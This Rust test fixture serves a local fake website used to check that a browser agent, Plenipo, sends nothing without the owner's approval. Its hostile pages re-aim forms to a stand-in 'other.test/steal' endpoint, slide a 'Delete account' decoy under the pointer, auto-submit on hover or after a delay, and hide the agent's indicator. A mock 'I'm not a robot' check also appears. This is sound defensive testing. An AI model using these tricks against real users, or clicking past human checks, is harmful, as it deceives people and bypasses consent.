//! A synthetic website for the Phase 10 browser tests: a tiny web server on 127.0.0.1 that the
//! test browser reaches under made-up names (`--host-resolver-rules` maps `*.test` to it), so
//! no test ever touches the internet. It records every form and message it receives (over HTTP
//! and over a WebSocket, at `/ws`), so tests can check that nothing was sent without the owner's
//! approval.

#![allow(dead_code)]

use std::collections::HashSet;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use futures_util::StreamExt as _;
use tokio::io::{AsyncReadExt as _, AsyncWriteExt as _};
use tokio::net::{TcpListener, TcpStream};
use tokio_tungstenite::tungstenite::Message;

/// What the site received: method, path, and body (`WS` for a text frame over a WebSocket).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Received {
    pub method: String,
    pub path: String,
    pub body: String,
}

#[derive(Clone)]
pub struct Site {
    pub port: u16,
    received: Arc<Mutex<Vec<Received>>>,
    /// The pages a test has let change their controls (`/may-change/<page>` says yes).
    released: Arc<Mutex<HashSet<String>>>,
    task: Arc<tokio::task::JoinHandle<()>>,
}

impl Drop for Site {
    fn drop(&mut self) {
        if Arc::strong_count(&self.task) == 1 {
            self.task.abort();
        }
    }
}

const STYLE: &str = "<style>body{font:16px system-ui;margin:40px;background:#fff}\
    label{display:block;margin:8px 0}input,textarea{font:inherit;width:320px}\
    button{font:inherit;padding:6px 14px}</style>";

fn page(title: &str, body: &str) -> String {
    format!(
        "<!doctype html><html><head><meta charset=utf-8><title>{title}</title>{STYLE}</head>\
         <body><h1>{title}</h1>{body}</body></html>"
    )
}

impl Site {
    pub async fn start() -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let port = listener.local_addr().unwrap().port();
        let received = Arc::new(Mutex::new(Vec::new()));
        let released = Arc::new(Mutex::new(HashSet::new()));
        let (log, pages) = (Arc::clone(&received), Arc::clone(&released));
        let task = tokio::spawn(async move {
            loop {
                let Ok((stream, _)) = listener.accept().await else {
                    break;
                };
                let (log, pages) = (Arc::clone(&log), Arc::clone(&pages));
                tokio::spawn(async move {
                    let _ = serve(stream, port, log, pages).await;
                });
            }
        });
        Self {
            port,
            received,
            released,
            task: Arc::new(task),
        }
    }

    /// Let `page` change its control now: it asks `/may-change/<page>` until this, then changes
    /// and tells the site (`/changed/<page>`). A test calls it once Plenipo has read the page.
    pub fn let_change(&self, page: &str) {
        self.released.lock().unwrap().insert(page.to_owned());
    }

    /// `http://<host>.test:<port><path>`.
    pub fn url(&self, host: &str, path: &str) -> String {
        format!("http://{host}.test:{}{path}", self.port)
    }

    /// Forms and messages received so far (POST and other sending requests, and WebSocket
    /// frames).
    pub fn sent(&self) -> Vec<Received> {
        self.received
            .lock()
            .unwrap()
            .iter()
            .filter(|r| r.method != "GET")
            .cloned()
            .collect()
    }

    /// Everything received so far, page reads included.
    pub fn requests(&self) -> Vec<Received> {
        self.received.lock().unwrap().clone()
    }
}

async fn serve(
    mut stream: TcpStream,
    port: u16,
    log: Arc<Mutex<Vec<Received>>>,
    released: Arc<Mutex<HashSet<String>>>,
) -> std::io::Result<()> {
    if let Some(path) = websocket_upgrade(&stream).await? {
        return serve_socket(stream, path, log).await;
    }
    let mut data = Vec::new();
    let mut buf = [0u8; 8192];
    let (head, body_start) = loop {
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            return Ok(());
        }
        data.extend_from_slice(&buf[..n]);
        if let Some(i) = data.windows(4).position(|w| w == b"\r\n\r\n") {
            break (String::from_utf8_lossy(&data[..i]).into_owned(), i + 4);
        }
    };
    let mut lines = head.lines();
    let mut first = lines.next().unwrap_or("").split_whitespace();
    let method = first.next().unwrap_or("GET").to_owned();
    let path = first.next().unwrap_or("/").to_owned();
    let length: usize = lines
        .filter_map(|l| l.split_once(':'))
        .find(|(k, _)| k.eq_ignore_ascii_case("content-length"))
        .and_then(|(_, v)| v.trim().parse().ok())
        .unwrap_or(0);
    while data.len() < body_start + length {
        let n = stream.read(&mut buf).await?;
        if n == 0 {
            break;
        }
        data.extend_from_slice(&buf[..n]);
    }
    let body = String::from_utf8_lossy(&data[body_start..]).into_owned();
    log.lock().unwrap().push(Received {
        method: method.clone(),
        path: path.clone(),
        body: body.clone(),
    });
    let (status, location, html) = match path.strip_prefix("/may-change/") {
        // Whether the test has let this page change its control yet.
        Some(page) if method == "GET" => {
            if released.lock().unwrap().contains(page) {
                ("200 OK", None, "yes".to_owned())
            } else {
                ("204 No Content", None, String::new())
            }
        }
        _ => route(&method, &path, &body, port),
    };
    if path == "/slow" {
        // Never answers: the browser's time limit must end it.
        tokio::time::sleep(Duration::from_secs(600)).await;
        return Ok(());
    }
    let text_file = path.ends_with(".txt");
    let mut response = format!(
        "HTTP/1.1 {status}\r\nContent-Type: {}; charset=utf-8\r\nContent-Length: {}\r\n\
         Cache-Control: no-store\r\nConnection: close\r\n",
        if text_file { "text/plain" } else { "text/html" },
        html.len()
    );
    if let Some(l) = location {
        response.push_str(&format!("Location: {l}\r\n"));
    }
    if path == "/report.txt" {
        // A file the website says to save rather than show (ADR-047).
        response.push_str("Content-Disposition: attachment; filename=\"report.txt\"\r\n");
    }
    response.push_str("\r\n");
    response.push_str(&html);
    stream.write_all(response.as_bytes()).await?;
    stream.shutdown().await
}

/// The request is a WebSocket handshake: its path. Peeks, so the stream still holds the whole
/// request for the handshake itself.
async fn websocket_upgrade(stream: &TcpStream) -> std::io::Result<Option<String>> {
    let mut buf = [0u8; 8192];
    for _ in 0..500 {
        let n = stream.peek(&mut buf).await?;
        if n == 0 {
            return Ok(None);
        }
        let head = String::from_utf8_lossy(&buf[..n]);
        if head.contains("\r\n\r\n") || n == buf.len() {
            let upgrade = head.lines().any(|l| {
                let l = l.to_ascii_lowercase();
                l.starts_with("upgrade:") && l.contains("websocket")
            });
            let path = head
                .lines()
                .next()
                .and_then(|l| l.split_whitespace().nth(1))
                .unwrap_or("/")
                .to_owned();
            return Ok(upgrade.then_some(path));
        }
        tokio::time::sleep(Duration::from_millis(10)).await;
    }
    Ok(None)
}

/// A live connection: complete the handshake, then record every text frame the page sends,
/// until the page closes it.
async fn serve_socket(
    stream: TcpStream,
    path: String,
    log: Arc<Mutex<Vec<Received>>>,
) -> std::io::Result<()> {
    let mut socket = tokio_tungstenite::accept_async(stream)
        .await
        .map_err(std::io::Error::other)?;
    while let Some(Ok(message)) = socket.next().await {
        if let Message::Text(text) = message {
            log.lock().unwrap().push(Received {
                method: "WS".into(),
                path: path.clone(),
                body: text.as_str().to_owned(),
            });
        }
    }
    Ok(())
}

fn route(
    method: &str,
    path: &str,
    body: &str,
    port: u16,
) -> (&'static str, Option<String>, String) {
    let ok = |html: String| ("200 OK", None, html);
    // The framed check's variant that opens a puzzle instead of passing.
    let puzzle = path.contains("puzzle");
    match (method, path.split('?').next().unwrap_or("/")) {
        ("GET", "/") => ok(page(
            "Synthetic Shop",
            "<p>Welcome to the test shop.</p><ul>\
             <li><a href=\"/form\">Contact us</a></li>\
             <li><a href=\"/shop\">Shop</a></li>\
             <li><a href=\"/login\">Sign in</a></li></ul>",
        )),
        ("GET", "/form") => ok(page(
            "Contact us",
            "<form method=post action=\"/send\">\
             <label>Your name <input name=name></label>\
             <label>Email <input name=email type=email></label>\
             <label>Message <textarea name=message></textarea></label>\
             <button type=submit>Send message</button></form>",
        )),
        ("POST", "/send") => {
            let name = body
                .split('&')
                .find_map(|kv| kv.strip_prefix("name="))
                .unwrap_or("")
                .replace('+', " ");
            ok(page(
                "Thank you",
                &format!("<p>Thanks, {name}. We got your message.</p>"),
            ))
        }
        ("GET", "/login") => ok(page(
            "Sign in",
            "<form method=post action=\"/session\">\
             <label>Email <input name=email></label>\
             <label>Password <input name=password type=password></label>\
             <button type=submit>Sign in</button></form>",
        )),
        ("GET", "/shop") => ok(page(
            "Shop",
            "<p>Blue mug — $12</p><form method=post action=\"/checkout\">\
             <input type=hidden name=item value=mug>\
             <button type=submit>Buy now</button></form>",
        )),
        ("POST", "/checkout") => ok(page("Order placed", "<p>Your order is placed.</p>")),
        ("GET", "/captcha") => ok(page(
            "Check",
            "<p>Please confirm you are a person.</p><div class=\"g-recaptcha\" \
             data-sitekey=\"test\"><button type=button>I'm not a robot</button>\
             <input name=answer></div>",
        )),
        // A check like a real one (ADR-032): its checkbox is inside its own frame, and passing
        // it writes the answer into the page, where Plenipo reads it. With `?puzzle`, the
        // check opens a puzzle frame instead.
        ("GET", "/captcha-frame") => ok(page(
            "Framed check",
            &format!(
                "<p>Please confirm you are a person.</p>\
                 <div class=\"g-recaptcha\" data-sitekey=\"test\">\
                 <iframe src=\"/recaptcha/anchor{}\" title=\"reCAPTCHA\" width=304 height=78 \
                 style=\"border:0\"></iframe>\
                 <textarea name=\"g-recaptcha-response\" style=\"display:none\"></textarea></div>\
                 <div id=puzzle style=\"visibility:hidden;position:absolute;top:160px;left:40px\">\
                 <iframe src=\"/recaptcha/bframe\" title=\"recaptcha challenge expires in two \
                 minutes\" width=400 height=580 style=\"border:0\"></iframe></div>\
                 <form method=post action=\"/send\"><input type=hidden name=name value=checked>\
                 <button type=submit>Send</button></form>\
                 <script>addEventListener('message', e => {{ \
                 if (e.data === 'plenipo-test:passed') \
                 document.querySelector('[name=g-recaptcha-response]').value = 'token-' + Date.now(); \
                 if (e.data === 'plenipo-test:puzzle') \
                 document.getElementById('puzzle').style.visibility = 'visible'; }})</script>",
                if puzzle { "?puzzle" } else { "" }
            ),
        )),
        // The check's widget, laid out like reCAPTCHA's: a 28-pixel checkbox at the left of a
        // 304 × 78 row, then the words. Only the checkbox itself answers.
        ("GET", "/recaptcha/anchor") => ok(format!(
            "<!doctype html><html><head><meta charset=utf-8><style>body{{margin:0;font:14px \
             system-ui}}.rc{{display:flex;align-items:center;height:78px;width:304px;\
             box-sizing:border-box;border:2px solid #d3d3d3;background:#f9f9f9}}\
             #box{{width:28px;height:28px;margin:0 12px;border:2px solid #c1c1c1;\
             border-radius:2px;background:#fff;box-sizing:border-box}}#box.on{{border-color:\
             #1a73e8}}</style></head><body><div class=rc><div id=box role=checkbox \
             aria-checked=false></div><span>I'm not a robot</span></div>\
             <script>document.getElementById('box').onclick = () => {{ \
             document.getElementById('box').className = 'on'; \
             parent.postMessage({}, '*') }}</script></body></html>",
            if puzzle {
                "'plenipo-test:puzzle'"
            } else {
                "'plenipo-test:passed'"
            }
        )),
        ("GET", "/recaptcha/bframe") => ok(page(
            "Puzzle",
            "<p>Select all images with a bus.</p>",
        )),
        ("GET", "/auto") => ok(page(
            "Auto",
            "<form id=f method=post action=\"/send\"><input name=name value=auto></form>\
             <script>document.getElementById('f').submit()</script>",
        )),
        ("GET", "/script-send") => ok(page(
            "Chat",
            "<p id=out>Ready</p><button type=button id=go>Go</button>\
             <script>document.getElementById('go').onclick = () => \
             fetch('/api/messages', {method: 'POST', body: 'hello'}).then(r => \
             document.getElementById('out').textContent = 'Sent: ' + r.status)</script>",
        )),
        ("POST", "/api/messages") => ok("{\"ok\":true}".into()),
        // A chat: its composer is a contenteditable outside any <form>, and Enter (or "Go")
        // sends what it holds over a live connection (a WebSocket) the network gate cannot see
        // into (ADR-035).
        ("GET", "/chat") => ok(page(
            "Chat",
            "<p id=out>Connecting</p>\
             <div id=composer contenteditable=true role=textbox aria-label=\"Message\" \
             style=\"border:1px solid #888;min-height:24px;width:320px;padding:4px\"></div>\
             <button type=button id=go>Go</button>\
             <script>const ws = new WebSocket('ws://' + location.host + '/ws'); \
             ws.onopen = () => document.getElementById('out').textContent = 'Connected'; \
             const send = () => { const c = document.getElementById('composer'); \
             ws.send(c.textContent); c.textContent = ''; \
             document.getElementById('out').textContent = 'Sent'; }; \
             document.getElementById('composer').addEventListener('keydown', e => { \
             if (e.key === 'Enter') { e.preventDefault(); send(); } }); \
             document.getElementById('go').onclick = send</script>",
        )),
        // A page whose harmless-looking button sends data on its own, 2.5 seconds later: long
        // after Plenipo stops watching the click (ADR-035).
        ("GET", "/late-send") => ok(page(
            "Late send",
            "<p id=out>Ready</p><button type=button id=go>Go</button> \
             <button type=button id=buy>Buy now</button>\
             <script>document.getElementById('go').onclick = () => { \
             document.getElementById('out').textContent = 'Saving soon'; \
             setTimeout(() => fetch('/api/messages', {method: 'POST', body: 'late'}).then(r => \
             document.getElementById('out').textContent = 'Sent: ' + r.status, () => \
             document.getElementById('out').textContent = 'Stopped'), 2500) }</script>",
        )),
        ("GET", "/to-blocked") => (
            "302 Found",
            Some(format!("http://blocked.test:{port}/")),
            String::new(),
        ),
        // A form whose script re-aims it at another website while the owner decides on the
        // click: the button the owner saw is not the one there when the click would happen. It
        // changes only when the test lets it (`Site::let_change`, asked at `/may-change/swap`),
        // once Plenipo has read the page, then tells the site (`/changed/swap`).
        ("GET", "/swap") => ok(page(
            "Swap",
            "<form id=f method=post action=\"/send\"><input name=name value=me>\
             <button type=submit>Send message</button></form>\
             <script>const ask = () => fetch('/may-change/swap').then((r) => { \
             if (r.status !== 200) return setTimeout(ask, 100); \
             document.getElementById('f').action = 'http://other.test/send'; \
             fetch('/changed/swap'); }, () => setTimeout(ask, 100)); ask();</script>",
        )),
        // A plain field that becomes a password field while the owner decides, when the test
        // lets it (`/may-change/turncoat`), then tells the site (`/changed/turncoat`).
        ("GET", "/turncoat") => ok(page(
            "Becomes a password",
            "<form method=post action=\"/send\"><label>Note <input id=n name=note></label>\
             <button type=submit>Send message</button></form>\
             <script>const ask = () => fetch('/may-change/turncoat').then((r) => { \
             if (r.status !== 200) return setTimeout(ask, 100); \
             document.getElementById('n').type = 'password'; \
             fetch('/changed/turncoat'); }, () => setTimeout(ask, 100)); ask();</script>",
        )),
        // A page that hides the owner's sign once (it should be put back); one that removes it
        // again and again (it should be stopped); and one whose own dialog, top-most widget, and
        // zoom on its root are simply there (an ordinary page: nothing to stop, and the sign
        // keeps its size).
        ("GET", "/sign-hide-once") => ok(page(
            "Hide once",
            "<p id=out>Waiting</p><script>setTimeout(() => { const s = \
             document.querySelector('plenipo-sign'); const out = document.getElementById('out'); \
             if (!s) { out.textContent = 'No sign'; return; } \
             s.style.setProperty('display', 'none', 'important'); \
             const hidden = getComputedStyle(s).display; \
             setTimeout(() => { const t = document.querySelector('plenipo-sign'); \
             out.textContent = 'Hidden: ' + hidden + ', later: ' + \
             (t ? getComputedStyle(t).display : 'gone'); }, 600); }, 300)</script>",
        )),
        ("GET", "/sign-fight") => ok(page(
            "Removes the sign",
            "<p>Fighting the sign.</p><script>const gone = () => { for (const s of \
             document.querySelectorAll('plenipo-sign')) s.remove(); }; \
             new MutationObserver(gone).observe(document.documentElement, { childList: true }); \
             setInterval(gone, 40); gone();</script>",
        )),
        ("GET", "/sign-under-dialog") => ok(page(
            "Dialog in front",
            "<style>html { zoom: 0.5 } body { zoom: 2 }</style>\
             <dialog id=d><p>Cookies?</p><button type=button id=ok>OK</button></dialog>\
             <div id=widget style=\"position:fixed;right:0;bottom:0;width:200px;height:120px;\
             z-index:2147483647;background:#ddd\">Chat with us</div>\
             <p id=out>Waiting</p><script>document.getElementById('d').showModal(); \
             setTimeout(() => { const s = document.querySelector('plenipo-sign'); \
             document.getElementById('out').textContent = 'Sign: ' + (s && s.isConnected && \
             getComputedStyle(s).display === 'block' ? 'shown' : 'gone') + ', dialog: ' + \
             (document.getElementById('d').open ? 'open' : 'closed') + ', size: ' + \
             (s && Math.abs(s.currentCSSZoom - 1) < 0.01 ? 'full' : 'shrunk'); }, 900)</script>",
        )),
        ("GET", "/secret-field") => ok(page(
            "Account",
            "<form method=post action=\"/save\"><label>API key \
             <input name=key></label><button type=submit>Save</button></form>",
        )),
        // Two links that save a file rather than open a page (ADR-047): the first because the
        // website answers with `Content-Disposition: attachment`, the second because the link
        // itself says so (its `download` attribute).
        ("GET", "/download") => ok(page(
            "Files to save",
            "<p>Take the files.</p><ul>\
             <li><a href=\"/report.txt\">Download the report</a></li>\
             <li><a href=\"/notes.txt\" download=\"notes.txt\">Save the notes</a></li></ul>",
        )),
        ("GET", "/report.txt") => ok("The quarterly report.\n".into()),
        ("GET", "/notes.txt") => ok("Notes for the worker.\n".into()),
        // Ways a page opens a new tab (ADR-046): a link to a page of this website, a link to a
        // blocked website, and a button whose script opens one (`window.open`, which keeps a
        // handle on the new window, unlike a link); "Buy now" asks the owner, so a test can look
        // at the browser while the worker waits.
        ("GET", "/new-tab") => ok(page(
            "New tab links",
            &format!(
                "<p>Open the second page.</p><ul>\
                 <li><a href=\"/second\" target=\"_blank\">Open the second page in a new tab</a></li>\
                 <li><a href=\"http://blocked.test:{port}/second\" target=\"_blank\">Open a blocked \
                 website in a new tab</a></li></ul>\
                 <button type=button id=win onclick=\"window.open('/second')\">Open the second \
                 page in a new window</button> <button type=button id=buy>Buy now</button>"
            ),
        )),
        ("GET", "/second") => ok(page(
            "Second page",
            "<p>You made it to the second page.</p><button type=button id=buy>Buy now</button>",
        )),
        // A page whose harmless-looking button opens a new tab by itself 2.5 seconds later: long
        // after Plenipo stops watching the click, while the click still counts for the browser's
        // own pop-up rules (ADR-046). "Again" only changes the page's words.
        ("GET", "/popup-timer") => ok(page(
            "Timer",
            "<p id=out>Ready</p><button type=button id=go>Go</button> \
             <button type=button id=buy>Buy now</button> \
             <button type=button id=again>Again</button>\
             <script>document.getElementById('go').onclick = () => { \
             document.getElementById('out').textContent = 'Opening soon'; \
             setTimeout(() => { window.open('/second'); \
             document.getElementById('out').textContent = 'Opened' }, 2500) }; \
             document.getElementById('again').onclick = () => \
             document.getElementById('out').textContent = 'Clicked again'</script>",
        )),
        // ADR-215 (P-BROWSER-1): pages that try to turn an approved click into something else.
        // A form re-aimed at another website the moment its button is pressed.
        ("GET", "/re-aim") => ok(page(
            "Re-aim",
            &format!(
                "<form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
                 <button type=submit id=go>Send message</button></form>\
                 <script>document.getElementById('go').onmousedown = () => {{ \
                 document.getElementById('f').action = 'http://other.test:{port}/steal'; }}</script>"
            ),
        )),
        // The same, re-aimed at another website that is on the owner's allowed list (pay.test),
        // so the website lists let it through and only the approval's binding stands in the way.
        ("GET", "/re-aim-allowed") => ok(page(
            "Re-aim to an allowed website",
            &format!(
                "<form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
                 <button type=submit id=go>Send message</button></form>\
                 <script>document.getElementById('go').onmousedown = () => {{ \
                 document.getElementById('f').action = 'http://pay.test:{port}/steal'; }}</script>"
            ),
        )),
        // An honest form that sends to another website (pay.test) from the start: the card names
        // both, and the approval covers the send.
        ("GET", "/pay") => ok(page(
            "Pay elsewhere",
            &format!(
                "<form method=post action=\"http://pay.test:{port}/inbox\">\
                 <input type=hidden name=order value=7>\
                 <button type=submit id=go>Send message</button></form>"
            ),
        )),
        ("POST", "/inbox") => ok(page("Received", "<p>Your message arrived.</p>")),
        // The same, re-aimed at another page of the same website.
        ("GET", "/re-aim-path") => ok(page(
            "Re-aim within the site",
            "<form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
             <button type=submit id=go>Send message</button></form>\
             <script>document.getElementById('go').onmousedown = () => { \
             document.getElementById('f').action = '/delete-account'; }</script>",
        )),
        ("POST", "/steal") => ok(page("Stolen", "<p>Got it.</p>")),
        ("POST", "/delete-account") => ok(page("Deleted", "<p>The account is gone.</p>")),
        // A page that sends its form by itself as soon as the pointer comes near the button;
        // the button itself does nothing. The button sits lower than on the other pages, so the
        // pointer (left where the last click was) has to travel to it: the send happens during
        // the pointer's approach, not as the page loads.
        ("GET", "/eager") => ok(page(
            "Eager",
            "<div style=\"height:260px\"></div>\
             <form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
             <button type=button id=go>Send message</button></form>\
             <script>document.getElementById('go').onmouseover = () => \
             document.getElementById('f').submit()</script>",
        )),
        // A same-site "Delete account" button moved under the pointer: as soon as the pointer
        // reaches "Send message" (/decoy), 10 ms after that (/decoy-late), or the moment the
        // mouse button goes down on it (/decoy-press).
        ("GET", "/decoy") | ("GET", "/decoy-late") | ("GET", "/decoy-press") => {
            let when = match path {
                "/decoy-late" => "go.onmouseover = () => setTimeout(move, 10)",
                "/decoy-press" => "go.onmousedown = move",
                _ => "go.onmouseover = move",
            };
            ok(page(
                "Decoy",
                &format!(
                    "<form method=post action=\"/send\"><input type=hidden name=name value=me>\
                     <button type=submit id=go>Send message</button></form>\
                     <form method=post action=\"/delete-account\">\
                     <button type=submit id=bad style=\"position:fixed;left:600px;top:400px\">\
                     Delete account</button></form>\
                     <script>const go = document.getElementById('go'); \
                     const bad = document.getElementById('bad'); \
                     const move = () => {{ const r = go.getBoundingClientRect(); \
                     bad.style.left = r.left + 'px'; bad.style.top = r.top + 'px'; \
                     bad.style.width = r.width + 'px'; bad.style.height = r.height + 'px'; \
                     bad.style.zIndex = '10'; }}; {when};</script>"
                ),
            ))
        }
        // A form whose answer page sends a message of its own as it loads: that send followed
        // the approved one and must be decided, never left held.
        ("GET", "/send-then-ping") => ok(page(
            "Send, then the answer pings",
            "<form method=post action=\"/answered\"><input type=hidden name=name value=me>\
             <button type=submit id=go>Send message</button></form>",
        )),
        ("POST", "/answered") => ok(page(
            "Answered",
            "<p id=out>Thanks. Telling home…</p><script>fetch('/api/messages', \
             {method: 'POST', body: 'ping'}).then(r => \
             document.getElementById('out').textContent = 'Pinged: ' + r.status, () => \
             document.getElementById('out').textContent = 'Ping stopped')</script>",
        )),
        // A page that submits its form 30 ms after the mouse button goes down on a button that
        // itself does nothing: between Plenipo's check and its question to the page.
        ("GET", "/press-send") => ok(page(
            "Sends on press",
            "<div style=\"height:260px\"></div>\
             <form id=f method=post action=\"/send\"><input type=hidden name=name value=me>\
             <button type=button id=go>Send message</button></form>\
             <script>document.getElementById('go').onmousedown = () => \
             setTimeout(() => document.getElementById('f').submit(), 30)</script>",
        )),
        // A button whose own script sends a message to this website: the ordinary case, which
        // must keep working under an approval.
        ("GET", "/js-send") => ok(page(
            "Script send",
            "<p id=out>Ready</p><button type=button id=go>Send message</button>\
             <script>document.getElementById('go').onclick = () => \
             fetch('/api/messages', {method: 'POST', body: 'hello'}).then(r => \
             document.getElementById('out').textContent = 'Sent: ' + r.status)</script>",
        )),
        _ => (
            "404 Not Found",
            None,
            page("Not found", "<p>No such page.</p>"),
        ),
    }
}
